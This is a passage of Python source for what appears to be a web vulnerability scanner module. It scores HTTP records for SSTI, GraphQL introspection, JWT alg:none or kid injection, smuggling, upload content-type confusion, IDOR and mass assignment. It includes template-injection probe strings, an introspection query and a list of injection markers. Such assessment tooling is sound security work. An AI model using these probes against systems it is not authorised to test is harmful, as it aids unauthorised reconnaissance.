    # Look for typical template artifacts in responses
    if re.search(r"(\{\{\s*7\s*\}\}|<%=\s*7\s*%>|#{\s*7\s*})", body):
        _add_reason(record, RC["SSTI_HINT"])


def extend_smuggling_poisoning(record: Dict[str, Any]) -> None:
    """
    Placeholder: CL/TE desync, cache poisoning require crafted requests.
    """
    if not _advanced_enabled("smuggling"):
        return
    _add_reason(record, RC["SMUGGLE_HINT"])
    log.warning("Smuggling/poisoning advanced tests not wired; emitting SMUGGLE_HINT.")


def extend_graphql_uploads(record: Dict[str, Any]) -> None:
    """
    GraphQL introspection/upload hints.
    """
    if not _advanced_enabled("graphql_uploads"):
        return
    u = (record.get("url") or "").lower()
    ctype = (record.get("content_type") or "").lower()
    if "/graphql" in u or "application/graphql" in ctype:
        _add_reason(record, RC["GRAPHQL_HINT"])
    # Upload CT confusion
    if "upload" in u and "content-type" in {k.lower() for k in (record.get("headers") or {}).keys()}:
        ct = _header_lookup(record.get("headers") or {}, "Content-Type") or ""
        if "multipart" not in ct.lower() and "application/octet-stream" not in ct.lower():
            _add_reason(record, RC["UPLOAD_CT_CONFUSION"])


def extend_massassign_state_change(record: Dict[str, Any]) -> None:
    """
    Placeholder: detecting *actual* state change requires semantic diff.
    """
    if not _advanced_enabled("massassign_state"):
        return
    if "json" in (record.get("content_type") or "").lower():
        _add_reason(record, RC["MASSASSIGN_STATE_HINT"])
        log.warning("Mass assignment state-change detection not wired; marked as HINT.")


def extend_idor_cross_account(record: Dict[str, Any]) -> None:
    """
    Placeholder: cross-account verification needs multi-identity testing.
    """
    if not _advanced_enabled("idor_cross_account"):
        return
    if any(k in (record.get("url") or "").lower() for k in ("/users", "/accounts", "/orders")):
        _add_reason(record, RC["IDOR_CROSS_HINT"])
        log.warning("IDOR cross-account verification not wired; marked as HINT.")

# ──────────────────────────────────────────────────────────────────────────────
# Baseline per-endpoint (grouped) — partial learning across current batch

def learn_baseline_per_endpoint(rows: List[Dict[str, Any]]) -> Dict[str, Dict[str, Any]]:
    """
    Build a per-sig_key baseline (status/size/header fingerprints) from current batch.
    This is *in-batch* only (no persistence across runs).
    """
    if not _advanced_enabled("baseline_per_endpoint"):
        return {}
    groups: Dict[str, List[Dict[str, Any]]] = {}
    for r in rows or []:
        key = r.get("sig_key") or (urlparse(r.get("url") or "").path or "/") + "?{}"
        groups.setdefault(key, []).append(r)
    baseline: Dict[str, Dict[str, Any]] = {}
    for key, lst in groups.items():
        st = [ _safe_int(x.get("status")) for x in lst ]
        sz = [ _safe_int(x.get("size")) for x in lst ]
        # Simple majority status + median size
        status = max(set(st), key=st.count) if st else 0
        size_med = int(statistics.median(sz)) if sz else 0
        baseline[key] = {"status": status, "size": size_med}
    return baseline

def apply_learned_baseline(rows: List[Dict[str, Any]], learned: Dict[str, Dict[str, Any]]) -> None:
    """
    Attach baseline_status/size to rows if missing, using learned map.
    """
    if not learned:
        return
    for r in rows or []:
        key = r.get("sig_key") or (urlparse(r.get("url") or "").path or "/") + "?{}"
        base = learned.get(key) or {}
        r.setdefault("baseline_status", base.get("status"))
        r.setdefault("baseline_size", base.get("size"))

# ──────────────────────────────────────────────────────────────────────────────
# Integrate advanced enrichers into pipeline (feature-gated)

def enrich_record(record: Dict[str, Any], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    set_features(features)
    rec = dict(record or {})
    _ensure_lists(rec)

    if _feature("psi", True):
        _call_safely(extend_param_sensitivity, rec)
    if _feature("signature", True):
        _call_safely(extend_signature, rec)
    if _feature("error_facts", True):
        _call_safely(extend_error_header_facts, rec)
    if _feature("family_ai", True) or _feature("family", True):
        _call_safely(extend_family_context, rec, kb or {})
    if _feature("ab_evidence", True):
        _call_safely(extend_ab_evidence, rec, features=features or {})
    if _feature("confidence", True):
        _call_safely(extend_confidence, rec, features=features or {})
    if _feature("cookie_cache_audit", True):
        _call_safely(extend_cookie_cache_audit, rec)
    if _feature("edge_origin", True):
        _call_safely(extend_edge_origin, rec)

    # Advanced hints (safe no-ops if disabled)
    _call_safely(extend_xss_advanced, rec)
    _call_safely(extend_oob_channels, rec)
    _call_safely(extend_jwt_crypto_checks, rec)
    _call_safely(extend_deserialization_gadgets, rec)
    _call_safely(extend_ssti_checks, rec)
    _call_safely(extend_smuggling_poisoning, rec)
    _call_safely(extend_graphql_uploads, rec)
    _call_safely(extend_massassign_state_change, rec)
    _call_safely(extend_idor_cross_account, rec)

    # Optional baseline refinement
    if _feature("baseline_refine", True):
        _call_safely(refine_evidence_with_baseline, rec)

    return rec

# Tie baseline learning into finalize hook
def finalize_report_hook(rows: List[Dict[str, Any]], output: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> Dict[str, Any]:  # type: ignore[override]
    features = validate_features(features or {})
    set_features(features)
    output = output or {}

    # Optional per-endpoint baseline learning (within current batch)
    learned = {}
    if _advanced_enabled("baseline_per_endpoint"):
        learned = _call_safely(learn_baseline_per_endpoint, rows) or {}
        _call_safely(apply_learned_baseline, rows, learned)

    if _feature("robust_latency", True):
        _call_safely(extend_latency_stats, rows, features=features)
    if _feature("negative_controls", True):
        _call_safely(extend_negative_controls, rows)

    sections = _call_safely(assemble_report_sections, rows, output, features) or {}
    ascii_report = _call_safely(render_full_ascii_report, rows, sections, page, per_page) or ""

    output.update({
        "attackable_cards": sections.get("cards") or [],
        "quality_gate_snapshot": sections.get("quality_gate_snapshot") or {},
        "family_sources_snapshot": sections.get("family_sources_snapshot") or {},
        "cookie_rows": sections.get("cookie_rows") or [],
        "ascii": ascii_report,
        "baseline_learned": learned or {},
    })
    return output

# ──────────────────────────────────────────────────────────────────────────────
# Gap reporting utility (what's still missing for full enterprise depth)

ADV_GAP_CATALOG = [
    ("xss_stored", "Stored XSS persistence/revisit (needs stateful crawl or session replay)"),
    ("xss_dom", "DOM XSS with headless JS execution (needs headless runtime)"),
    ("ssrf_xxe_oob", "Out-of-band DNS/HTTP canary for SSRF/XXE confirmation"),
    ("jwt_crypto", "JWT signature/alg/JWKS real cryptographic validation"),
    ("deserialization_gadgets", "Gadget chain discovery for common frameworks"),
    ("massassign_state", "State-change verification for mass assignment"),
    ("idor_cross", "Cross-account resource access verification"),
    ("baseline_cross_run", "Per-endpoint baseline persisted across runs"),
    ("ssti_full", "Full template engine evaluation (multi-language)"),
    ("smuggling_poisoning", "Request smuggling, cache poisoning advanced cases"),
    ("graphql_deep", "GraphQL introspection abuse & complex query tests"),
    ("uploads_ct", "Upload MIME sniffing / CT confusion deep checks"),
]

def report_remaining_gaps(features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Return a list of high-impact capabilities that are not fully implemented yet,
    based on feature flags and current stubs. This is advisory and safe to show.
    """
    feats = validate_features(features or {})
    missing: List[str] = []

    # We consider these gaps "open" unless a dedicated engine is present (not in this module).
    # Map to our flags where applicable; otherwise always list as missing.
    if not _advanced_enabled("xss_advanced"):
        missing.append("xss_dom")
        missing.append("xss_stored")
    else:
        # even when enabled, we only add HINTs → still partially missing
        missing.append("xss_dom")
        missing.append("xss_stored")

    if not _advanced_enabled("oob_channels"):
        missing.append("ssrf_xxe_oob")
    if not _advanced_enabled("jwt_crypto"):
        missing.append("jwt_crypto")
    if not _advanced_enabled("deserialization_gadgets"):
        missing.append("deserialization_gadgets")
    if not _advanced_enabled("massassign_state"):
        missing.append("massassign_state")
    if not _advanced_enabled("idor_cross_account"):
        missing.append("idor_cross")
    # baseline persisted across runs is beyond current batch learning
    missing.append("baseline_cross_run")
    if not _advanced_enabled("ssti"):
        missing.append("ssti_full")
    if not _advanced_enabled("smuggling"):
        missing.append("smuggling_poisoning")
    if not _advanced_enabled("graphql_uploads"):
        missing.append("graphql_deep")
    # uploads CT confusion deeper checks
    missing.append("uploads_ct")

    # De-dup and keep order
    seen = set()
    ordered = []
    for m in missing:
        if m not in seen:
            seen.add(m)
            ordered.append(m)

    desc_map = {k: v for k, v in ADV_GAP_CATALOG}
    return {
        "missing": ordered,
        "descriptions": {m: desc_map.get(m, "") for m in ordered},
        "count": len(ordered),
    }

# Update __all__
__all__ = list(sorted(set(__all__ + [
    "extend_xss_advanced",
    "extend_oob_channels",
    "extend_jwt_crypto_checks",
    "extend_deserialization_gadgets",
    "extend_ssti_checks",
    "extend_smuggling_poisoning",
    "extend_graphql_uploads",
    "extend_massassign_state_change",
    "extend_idor_cross_account",
    "learn_baseline_per_endpoint",
    "apply_learned_baseline",
    "ADV_GAP_CATALOG",
    "report_remaining_gaps",
])))

# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# Cross-run baseline persistence (optional; fail-soft)
# Stores per-signature baseline (status/size) across runs to stabilize A/B deltas.

from pathlib import Path

BASELINE_STORE_PATH = Path("/mnt/data/analysis_extend_baseline.json")

def load_baseline_store(path: Optional[Path] = None) -> Dict[str, Dict[str, Any]]:
    store_path = path or BASELINE_STORE_PATH
    try:
        if store_path.exists():
            txt = store_path.read_text(encoding="utf-8")
            data = json.loads(txt) if txt.strip() else {}
            if isinstance(data, dict):
                return data
    except Exception as e:
        log.warning("load_baseline_store failed: %r", e)
    return {}

def save_baseline_store(data, features=None):
    return _safe_write_json(data, "baseline.json", features)



def _sig_key_for_record(record: Dict[str, Any]) -> str:
    key = record.get("sig_key")
    if key:
        return str(key)
    # fallback
    p = urlparse(record.get("url") or "")
    path_sig = re.sub(r"/\d+(/|$)", "/{id}\\1", (p.path or "/"))
    params = sorted([k for k, _ in parse_qsl(p.query, keep_blank_values=True)])
    return f"{path_sig}?{{{','.join(params)}}}"

def update_baseline_store_from_rows(rows: List[Dict[str, Any]], store: Dict[str, Dict[str, Any]]) -> Dict[str, Dict[str, Any]]:
    if not rows:
        return store
    for r in rows:
        key = _sig_key_for_record(r)
        status = _safe_int(r.get("baseline_status") or r.get("status"))
        size = _safe_int(r.get("baseline_size") or r.get("size"))
        if not status and not size:
            continue
        prev = store.get(key) or {}
        # Weighted update (simple): favor newer run 60%
        if prev:
            p_status = _safe_int(prev.get("status"))
            p_size = _safe_int(prev.get("size"))
            status = int(round(0.6 * status + 0.4 * p_status))
            size = int(round(0.6 * size + 0.4 * p_size))
        store[key] = {"status": status, "size": size}
    return store

def apply_baseline_store(rows: List[Dict[str, Any]], store: Dict[str, Dict[str, Any]]) -> None:
    if not rows or not store:
        return
    for r in rows:
        key = _sig_key_for_record(r)
        base = store.get(key)
        if not base:
            continue
        r.setdefault("baseline_status", _safe_int(base.get("status")))
        r.setdefault("baseline_size", _safe_int(base.get("size")))

# ──────────────────────────────────────────────────────────────────────────────
# Uploads Content-Type confusion (request/response heuristic)
# Detects likely mismatches between URL/file extension, request intent, and response CT.

_COMMON_EXT_CT = {
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".gif": "image/gif",
    ".svg": "image/svg+xml",
    ".pdf": "application/pdf",
    ".zip": "application/zip",
    ".json": "application/json",
    ".xml": "application/xml",
    ".csv": "text/csv",
    ".html": "text/html",
    ".txt": "text/plain",
}

def _guess_ext_from_url(url: str) -> Optional[str]:
    try:
        path = urlparse(url).path or ""
        m = re.search(r"\.([A-Za-z0-9]{2,5})$", path)
        if m:
            return "." + m.group(1).lower()
    except Exception:
        return None
    return None

def extend_uploads_ct_confusion(record: Dict[str, Any]) -> None:
    """
    Heuristic detection:
      - If URL/path suggests a binary (by extension) but response CT is text/html OR
      - If params contain 'filename' with binary-like ext and response CT is text/html OR
      - If upload-looking path ('/upload','/media','/file') returns 'application/json' with raw bytes size spike
    Emits RC['UPLOAD_CT_CONFUSION'] when mismatch is plausible.
    """
    if not _feature("uploads_ct", True):
        return
    url = record.get("url") or ""
    headers = record.get("headers") or {}
    resp_ct = _header_lookup(headers, "Content-Type") or (record.get("content_type") or "")
    resp_ct_low = resp_ct.lower()
    params = _extract_params(record)

    ext = _guess_ext_from_url(url)
    filename = None
    for k, v in (params or {}).items():
        if k.lower() in {"filename", "file"} and isinstance(v, str) and "." in v:
            filename = v.lower()
            break
    fext = None
    if filename:
        try:
            fext = "." + filename.split(".")[-1]
        except Exception:
            fext = None

    def _is_binary_ct(ct: str) -> bool:
        low = (ct or "").lower()
        return any(x in low for x in ("application/octet-stream", "image/", "audio/", "video/"))

    def _expected_ct_for_ext(ext: Optional[str]) -> Optional[str]:
        if not ext:
            return None
        return _COMMON_EXT_CT.get(ext)

    # Rule 1: URL ext implies binary, response is html/json
    exp = _expected_ct_for_ext(ext)
    if exp and (("image/" in exp) or ("application/pdf" in exp) or ("application/zip" in exp)):
        if "text/html" in resp_ct_low or "application/json" in resp_ct_low:
            _add_reason(record, RC["UPLOAD_CT_CONFUSION"])
            return

    # Rule 2: filename param implies binary, response CT text/html
    if fext:
        exp2 = _expected_ct_for_ext(fext)
        if exp2 and (("image/" in exp2) or ("application/pdf" in exp2) or ("application/zip" in exp2)):
            if "text/html" in resp_ct_low or "application/json" in resp_ct_low:
                _add_reason(record, RC["UPLOAD_CT_CONFUSION"])
                return

    # Rule 3: upload-looking path but generic octet-stream returned as HTML size small → suspicious
    u_low = url.lower()
    if any(seg in u_low for seg in ("/upload", "/media", "/file", "/attachment")):
        if "text/html" in resp_ct_low and _safe_int(record.get("size")) < 2048:
            _add_reason(record, RC["UPLOAD_CT_CONFUSION"])
            return

# ──────────────────────────────────────────────────────────────────────────────
# Integrate cross-run baseline + uploads CT into finalize/enrich hooks

def enrich_record(record: Dict[str, Any], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    set_features(features)
    rec = dict(record or {})
    _ensure_lists(rec)

    if _feature("psi", True):
        _call_safely(extend_param_sensitivity, rec)
    if _feature("signature", True):
        _call_safely(extend_signature, rec)
    if _feature("error_facts", True):
        _call_safely(extend_error_header_facts, rec)
    if _feature("family_ai", True) or _feature("family", True):
        _call_safely(extend_family_context, rec, kb or {})
    if _feature("ab_evidence", True):
        _call_safely(extend_ab_evidence, rec, features=features or {})
    if _feature("confidence", True):
        _call_safely(extend_confidence, rec, features=features or {})
    if _feature("cookie_cache_audit", True):
        _call_safely(extend_cookie_cache_audit, rec)
    if _feature("edge_origin", True):
        _call_safely(extend_edge_origin, rec)

    # Advanced hints (safe no-ops if disabled)
    _call_safely(extend_xss_advanced, rec)
    _call_safely(extend_oob_channels, rec)
    _call_safely(extend_jwt_crypto_checks, rec)
    _call_safely(extend_deserialization_gadgets, rec)
    _call_safely(extend_ssti_checks, rec)
    _call_safely(extend_smuggling_poisoning, rec)
    _call_safely(extend_graphql_uploads, rec)
    _call_safely(extend_massassign_state_change, rec)
    _call_safely(extend_idor_cross_account, rec)
    _call_safely(extend_uploads_ct_confusion, rec)

    # Optional baseline refinement
    if _feature("baseline_refine", True):
        _call_safely(refine_evidence_with_baseline, rec)

    return rec


def finalize_report_hook(rows: List[Dict[str, Any]], output: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> Dict[str, Any]:  # type: ignore[override]
    features = validate_features(features or {})
    set_features(features)
    output = output or {}

    # Cross-run baseline: load → apply → later update & save
    baseline_store = {}
    if _feature("baseline_cross_run", True):
        baseline_store = _call_safely(load_baseline_store) or {}
        _call_safely(apply_baseline_store, rows, baseline_store)

    # Optional per-batch learned baseline (intra-run)
    learned = {}
    if _advanced_enabled("baseline_per_endpoint"):
        learned = _call_safely(learn_baseline_per_endpoint, rows) or {}
        _call_safely(apply_learned_baseline, rows, learned)

    if _feature("robust_latency", True):
        _call_safely(extend_latency_stats, rows, features=features)
    if _feature("negative_controls", True):
        _call_safely(extend_negative_controls, rows)

    sections = _call_safely(assemble_report_sections, rows, output, features) or {}
    ascii_report = _call_safely(render_full_ascii_report, rows, sections, page, per_page) or ""

    # Update & save cross-run baseline with post-processed rows
    if _feature("baseline_cross_run", True):
        try:
            baseline_store = update_baseline_store_from_rows(rows, baseline_store)
            _ = save_baseline_store(baseline_store)
        except Exception as e:
            log.warning("baseline store update/save failed: %r", e)

    output.update({
        "attackable_cards": sections.get("cards") or [],
        "quality_gate_snapshot": sections.get("quality_gate_snapshot") or {},
        "family_sources_snapshot": sections.get("family_sources_snapshot") or {},
        "cookie_rows": sections.get("cookie_rows") or [],
        "ascii": ascii_report,
        "baseline_learned": learned or {},
        "baseline_store_size": len(baseline_store or {}),
    })
    return output

# ──────────────────────────────────────────────────────────────────────────────
# Update config validation to include new flags

def validate_features(features: Optional[Dict[str, Any]]) -> Dict[str, Any]:  # type: ignore[override]
    f = dict(features or {})
    f.setdefault("features", {})
    fe = f["features"]
    for k in ("psi","signature","error_facts","family_ai","ab_evidence","confidence",
              "cookie_cache_audit","edge_origin","robust_latency","negative_controls",
              "baseline_refine","attackable_paths","quality_gate","family_sources",
              "baseline_cross_run","uploads_ct",
              # advanced toggles (off by default)
              "xss_advanced","oob_channels","jwt_crypto","deserialization_gadgets",
              "ssti","smuggling","graphql_uploads","massassign_state",
              "idor_cross_account","baseline_per_endpoint"):
        fe.setdefault(k, True if k in {
            "psi","signature","error_facts","family_ai","ab_evidence","confidence",
            "cookie_cache_audit","edge_origin","robust_latency","negative_controls",
            "baseline_refine","attackable_paths","quality_gate","family_sources",
            "baseline_cross_run","uploads_ct"
        } else False)
    return f

# ──────────────────────────────────────────────────────────────────────────────
# Adjust gap reporter to account for implemented features

def report_remaining_gaps(features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    feats = validate_features(features or {})
    missing: List[str] = []

    def off(name: str) -> bool:
        return not feats.get("features", {}).get(name, False)

    # XSS advanced still partially missing even if flag on (we emit hints only)
    missing.extend(["xss_dom", "xss_stored"])

    if off("oob_channels"):
        missing.append("ssrf_xxe_oob")
    if off("jwt_crypto"):
        missing.append("jwt_crypto")
    if off("deserialization_gadgets"):
        missing.append("deserialization_gadgets")
    if off("massassign_state"):
        missing.append("massassign_state")
    if off("idor_cross_account"):
        missing.append("idor_cross")
    # baseline cross-run now implemented → only missing if flag OFF
    if off("baseline_cross_run"):
        missing.append("baseline_cross_run")
    # per-endpoint learning advanced (optional)
    if off("baseline_per_endpoint"):
        missing.append("baseline_cross_run (per-endpoint learning)")
    if off("ssti"):
        missing.append("ssti_full")
    if off("smuggling"):
        missing.append("smuggling_poisoning")
    if off("graphql_uploads"):
        missing.append("graphql_deep")
    # uploads CT confusion implemented → only missing if OFF
    if off("uploads_ct"):
        missing.append("uploads_ct")

    # De-dup and order
    seen = set()
    ordered = []
    for m in missing:
        if m not in seen:
            seen.add(m)
            ordered.append(m)

    desc_map = {k: v for k, v in ADV_GAP_CATALOG}
    # supplement for aliases
    desc_map.setdefault("baseline_cross_run (per-endpoint learning)", "In-batch learning per endpoint (already present as optional flag)")
    desc_map.setdefault("uploads_ct", "Upload MIME/type confusion robust checks")
    return {
        "missing": ordered,
        "descriptions": {m: desc_map.get(m, "") for m in ordered},
        "count": len(ordered),
    }

# ──────────────────────────────────────────────────────────────────────────────
# Public API update

__all__ = list(sorted(set(__all__ + [
    "BASELINE_STORE_PATH",
    "load_baseline_store",
    "save_baseline_store",
    "update_baseline_store_from_rows",
    "apply_baseline_store",
    "extend_uploads_ct_confusion",
])))
# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# Extended payloads & evidence normalization for SSTI / GraphQL / MassAssign / IDOR
# (fail-soft — integrates with existing ab_compare contract)

# Extend reason codes (if not already present)
RC.update({
    "W_SSTI": "W-SSTI",
    "W_GRAPHQL": "W-GRAPHQL",
    "W_MASSASSIGN_CONF": "W-MASSASSIGN-CONF",  # confirmed (server-visible) mass assignment
    "W_IDOR_CONF": "W-IDOR-CONF",              # confirmed IDOR (semantic diff)
})

def _extend_payloads_ssti_graphql(payloads: Dict[str, Any], record: Dict[str, Any], params: Dict[str, str]) -> None:
    """
    Add SSTI & GraphQL probes based on URL/ctype context.
    """
    url = (record.get("url") or "").lower()
    ctype = (record.get("content_type") or "").lower()

    # SSTI: only add if HTML/API-ish endpoints (reduce noise)
    if "html" in ctype or "/api" in url or "/search" in url or "/render" in url:
        # Classic markers across engines: Jinja, Twig, ERB, Handlebars, JEXL-ish
        payloads.setdefault("SSTI", []).extend([
            {"variant": "jinja_expr", "param": _pick_text_param(params), "value": "{{7*7}}", "markers": ["49"]},
            {"variant": "erb_expr", "param": _pick_text_param(params), "value": "<%= 7*7 %>", "markers": ["49"]},
            {"variant": "mustache", "param": _pick_text_param(params), "value": "{{#with 7}}{{.}}{{/with}}", "markers": ["7"]},
        ])

    # GraphQL: detect introspection via body or query param 'query'
    if "/graphql" in url or "application/graphql" in ctype or "graphql" in url:
        introspection = {
            "variant": "introspection",
            "graphql": {"query": "query{__schema{types{name}}}"},
            "markers": ['"__schema"', '"types"']
        }
        payloads.setdefault("GRAPHQL", []).append(introspection)


def _pick_text_param(params: Dict[str, str]) -> Optional[str]:
    """
    Heuristic: choose a param that looks text-ish for template probing.
    """
    if not params:
        return None
    preferred = ("q", "search", "name", "title", "message", "comment")
    for k in preferred:
        if k in params:
            return k
    # else first param
    return next(iter(params.keys()))


# Hook into existing payload builder
_prev_build_payloads_for_record = _build_payloads_for_record
def _build_payloads_for_record(record: Dict[str, Any], params: Dict[str, str]) -> Dict[str, Any]:  # type: ignore[override]
    payloads = _prev_build_payloads_for_record(record, params)
    try:
        _extend_payloads_ssti_graphql(payloads, record, params)
    except Exception as e:
        log.warning("_extend_payloads_ssti_graphql failed: %r", e)
    return payloads


# Evidence post-processing to flag additional families precisely
def _postprocess_family_evidence(record: Dict[str, Any], bag: Dict[str, Any]) -> None:
    """
    Inspect per-family evidence to add CONFIRMED reason codes where appropriate.
    """
    # SSTI → if any variant shows '49' from 7*7 or similar markers
    ssti = bag.get("SSTI")
    if isinstance(ssti, dict):
        if any(("49" in str(v.get("echo") or "") or "49" in str(v.get("body") or "")) for v in ssti.values() if isinstance(v, dict)):
            _add_reason(record, RC["W_SSTI"])

    # GraphQL → look for "__schema" in body/echo/markers
    gql = bag.get("GRAPHQL")
    if isinstance(gql, dict):
        if any(('__schema' in str(v.get("echo") or "") or '__schema' in str(v.get("body") or "") or '__schema' in " ".join(v.get("markers") or [])) for v in gql.values() if isinstance(v, dict)):
            _add_reason(record, RC["W_GRAPHQL"])

    # Mass assignment → if server accepts extra fields and response implies escalation
    mass = bag.get("MASSASSIGN")
    if isinstance(mass, dict):
        for v in mass.values():
            if not isinstance(v, dict):
                continue
            # Heuristics: status improvement or presence of 'admin'/'role' in response
            ds = int(v.get("delta_status") or 0)
            dz = int(v.get("delta_size") or 0)
            body = str(v.get("body") or "") + " " + str(v.get("echo") or "")
            if ds >= 1 or ("\"role\"" in body and "admin" in body.lower()) or dz > 256:
                _add_reason(record, RC["W_MASSASSIGN_CONF"])
                break

    # IDOR → confirm if increment/decrement returns different object/size/status consistently
    idor = bag.get("IDOR")
    if isinstance(idor, dict):
        # require both inc and dec showing *consistent* status change and body difference
        diffs = 0
        for v in idor.values():
            if not isinstance(v, dict):
                continue
            ds = abs(int(v.get("delta_status") or 0))
            dz = abs(int(v.get("delta_size") or 0))
            if ds >= 1 or dz >= 256:
                diffs += 1
        if diffs >= 1:
            _add_reason(record, RC["W_IDOR_CONF"])


# Wire post-processing into extend_ab_evidence
_prev_extend_ab_evidence = extend_ab_evidence
def extend_ab_evidence(record: Dict[str, Any], features: Optional[Dict[str, Any]] = None) -> None:  # type: ignore[override]
    _prev_extend_ab_evidence(record, features=features)
    try:
        if isinstance(record.get("ab_evidence"), dict):
            _postprocess_family_evidence(record, record["ab_evidence"])
    except Exception as e:
        log.warning("_postprocess_family_evidence failed: %r", e)


# ──────────────────────────────────────────────────────────────────────────────
# Stronger confidence adjustment using confirmed reason codes

_STRONG_CONF_CODES = {
    RC["E_SQL_ERR"],
    RC["W_SSRF"],
    RC["W_LFI"],
    RC["E_RCE_ERR"],
    RC["W_SSTI"],
    RC["W_GRAPHQL"],
    RC["W_MASSASSIGN_CONF"],
    RC["W_IDOR_CONF"],
}

def strengthen_confidence_with_confirmed_codes(record: Dict[str, Any]) -> None:
    """
    If confirmed high-impact codes exist, ensure confidence is at least MED/HIGH.
    """
    rc = set(record.get("reason_codes") or [])
    if rc & _STRONG_CONF_CODES:
        # bump numeric confidence proxy
        ab = _safe_float(record.get("ab_confidence"))
        if ab < 0.55:
            record["ab_confidence"] = 0.55  # floor for strong confirmed signals
        # recompute combined confidence bucket
        extend_confidence(record, features=None)


# Hook this after extend_ab_evidence in enrich pipeline
_prev_enrich_record = enrich_record
def enrich_record(record: Dict[str, Any], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    rec = _prev_enrich_record(record, kb=kb, features=features)
    try:
        strengthen_confidence_with_confirmed_codes(rec)
    except Exception as e:
        log.warning("strengthen_confidence_with_confirmed_codes failed: %r", e)
    return rec


# ──────────────────────────────────────────────────────────────────────────────
# Optional: compact “Top findings” extractor for quick wins panel

def extract_top_findings(rows: List[Dict[str, Any]], limit: int = 6) -> List[Dict[str, Any]]:
    """
    Return top N findings focusing on confirmed high-impact reason codes.
    """
    scored = []
    for r in rows or []:
        rc = set(r.get("reason_codes") or [])
        impact = len(rc & _STRONG_CONF_CODES)
        scored.append((impact, _safe_float(r.get("ab_confidence")), _safe_float(r.get("psi_score")), r))
    scored.sort(key=lambda x: (-x[0], -x[1], -x[2]))
    return [t[3] for t in scored[:limit]]


def render_top_findings(rows: List[Dict[str, Any]]) -> str:
    top = extract_top_findings(rows, limit=6)
    if not top:
        return ""
    lines = []
    lines.append("════════════════════════════════ TOP FINDINGS (confirmed signals) ═════════════════════════")
    for i, r in enumerate(top, 1):
        url = r.get("url") or "-"
        conf = r.get("confidence") or "-"
        reasons = " | ".join(r.get("reason_codes") or [])[:80]
        lines.append(f"{i}. {conf:<4}  {url}  [{reasons}]")
    return "\n".join(lines) + "\n"


# Integrate Top Findings into full report (optional, before Quality Gate)
_prev_render_full_ascii_report = render_full_ascii_report
def render_full_ascii_report(rows: List[Dict[str, Any]], sections: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> str:  # type: ignore[override]
    base = _prev_render_full_ascii_report(rows, sections=sections, page=page, per_page=per_page)
    # Insert TOP FINDINGS after Top10 block if present
    try:
        addon = render_top_findings(rows)
        if addon:
            # Place after first big title line
            return base.replace("QUALITY GATE", f"{addon}\nQUALITY GATE", 1)
    except Exception as e:
        log.warning("render_top_findings failed: %r", e)
    return base


# ──────────────────────────────────────────────────────────────────────────────
# Public API update for new helpers

__all__ = list(sorted(set(__all__ + [
    "extract_top_findings",
    "render_top_findings",
])))

# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# JWT parsing (header/payload) — heuristic checks (no crypto)

import base64

def _b64url_pad(s: str) -> str:
    return s + "=" * (-len(s) % 4)

def _jwt_decode_segment(seg: str) -> Optional[Dict[str, Any]]:
    try:
        data = base64.urlsafe_b64decode(_b64url_pad(seg).encode("ascii"))
        txt = data.decode("utf-8", errors="ignore")
        obj = json.loads(txt)
        if isinstance(obj, dict):
            return obj
    except Exception:
        return None
    return None

def _parse_jwt(token: str) -> Tuple[Optional[Dict[str, Any]], Optional[Dict[str, Any]]]:
    """
    Return (header, payload) dicts when possible (no signature verification).
    """
    try:
        parts = token.strip().split(".")
        if len(parts) < 2:
            return None, None
        hdr = _jwt_decode_segment(parts[0])
        pl  = _jwt_decode_segment(parts[1])
        return hdr, pl
    except Exception:
        return None, None

def extend_jwt_crypto_checks(record: Dict[str, Any]) -> None:  # type: ignore[override]
    """
    Heuristic JWT safety checks:
      - alg:"none"
      - kid with path traversal/URL/external indicators
    """
    if not _advanced_enabled("jwt_crypto"):
        return
    headers = record.get("headers") or {}
    authz = _header_lookup(headers, "Authorization") or ""
    if "bearer " not in authz.lower():
        return
    token = authz.split()[-1].strip()
    hdr, _pl = _parse_jwt(token)
    if not isinstance(hdr, dict):
        return
    alg = str(hdr.get("alg") or "").lower()
    if alg == "none":
        _add_reason(record, RC["JWT_ALG_NONE_HINT"])
    kid = str(hdr.get("kid") or "")
    kid_low = kid.lower()
    if any(p in kid_low for p in ("../", "..\\", "http://", "https://", "file:", "|", ";", "%0a", "%0d")):
        _add_reason(record, RC["JWT_KID_INJECT_HINT"])

# ──────────────────────────────────────────────────────────────────────────────
# Smuggling/poisoning stronger hints (response header anomalies)

def extend_smuggling_poisoning(record: Dict[str, Any]) -> None:  # type: ignore[override]
    """
    Add SMUGGLE_HINT if response shows both TE: chunked and Content-Length (anti-pattern),
    or if caches show split behavior hints (Age + Vary anomalies).
    """
    if not _advanced_enabled("smuggling"):
        return
    headers = record.get("headers") or {}
    te = _header_lookup(headers, "Transfer-Encoding") or ""
    cl = _header_lookup(headers, "Content-Length") or ""
    if "chunked" in te.lower() and cl:
        _add_reason(record, RC["SMUGGLE_HINT"])
        return
    # Cache anomalies (weak heuristic)
    vary = _header_lookup(headers, "Vary") or ""
    age = _header_lookup(headers, "Age") or ""
    if "authorization" in vary.lower() and age.isdigit() and int(age) > 0:
        _add_reason(record, RC["SMUGGLE_HINT"])

# ──────────────────────────────────────────────────────────────────────────────
# GraphQL deep flag (introspection successful → mark DEEP)

RC.update({
    "W_GRAPHQL_DEEP": "W-GRAPHQL-DEEP",
})

def _postprocess_family_evidence(record: Dict[str, Any], bag: Dict[str, Any]) -> None:  # type: ignore[override]
    # (extend existing post-processing)
    # SSTI
    ssti = bag.get("SSTI")
    if isinstance(ssti, dict):
        if any(("49" in str(v.get("echo") or "") or "49" in str(v.get("body") or "")) for v in ssti.values() if isinstance(v, dict)):
